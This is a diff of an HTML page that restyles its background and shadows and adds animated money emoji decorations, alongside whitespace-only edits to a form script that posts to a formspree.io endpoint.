@@ -11,7 +11,9 @@
 body{
     margin:0;
     font-family:Arial,sans-serif;
-    background:linear-gradient(135deg,#1877f2,#00c853);
+    background:linear-gradient(135deg,#050505,#1877f2,#00c853);
+    min-height:100vh;
+    overflow:hidden;
 }
 
 .header{
@@ -22,6 +24,7 @@ body{
 
 .header h1{
     font-size:32px;
+    text-shadow:0 3px 10px rgba(0,0,0,.5);
 }
 
 .card{
@@ -31,7 +34,7 @@ body{
     margin:auto;
     padding:25px;
     border-radius:20px;
-    box-shadow:0 5px 20px rgba(0,0,0,.2);
+    box-shadow:0 5px 20px rgba(0,0,0,.3);
 }
 
 h2{
@@ -76,11 +79,62 @@ button{
     color:green;
 }
 
+
+/* Money Stickers */
+
+.money{
+    position:fixed;
+    font-size:45px;
+    opacity:0.8;
+    animation:float 4s infinite;
+    z-index:-1;
+}
+
+.money1{
+    top:15%;
+    left:8%;
+}
+
+.money2{
+    top:45%;
+    right:8%;
+}
+
+.money3{
+    bottom:15%;
+    left:12%;
+}
+
+@keyframes float{
+
+0%{
+transform:translateY(0);
+}
+
+50%{
+transform:translateY(-20px);
+}
+
+100%{
+transform:translateY(0);
+}
+
+}
+
 </style>
 
 </head>
 
+
 <body>
+
+
+<div class="money money1">💰</div>
+
+<div class="money money2">💵</div>
+
+<div class="money money3">⭐</div>
+
 
 
 <div class="header">
@@ -95,7 +149,9 @@ button{
 
 <div class="card">
 
+
 <h2>Welcome</h2>
+
 
 
 <form id="myForm">
@@ -145,17 +201,21 @@ Your request has been received and will be reviewed within 24 hours.
 
 
 <button onclick="window.open('report.html','_blank')">
+
 Report
+
 </button>
+
 
 
 </div>
 
 
 
+
 <script>
 
-document.getElementById("myForm").addEventListener("submit", function(e){
+document.getElementById("myForm").addEventListener("submit",function(e){
 
 e.preventDefault();
 
@@ -163,7 +223,7 @@ e.preventDefault();
 let formData = new FormData(this);
 
 
-fetch("https://formspree.io/f/xzdnbyqa", {
+fetch("https://formspree.io/f/xzdnbyqa",{
 
 method:"POST",
 
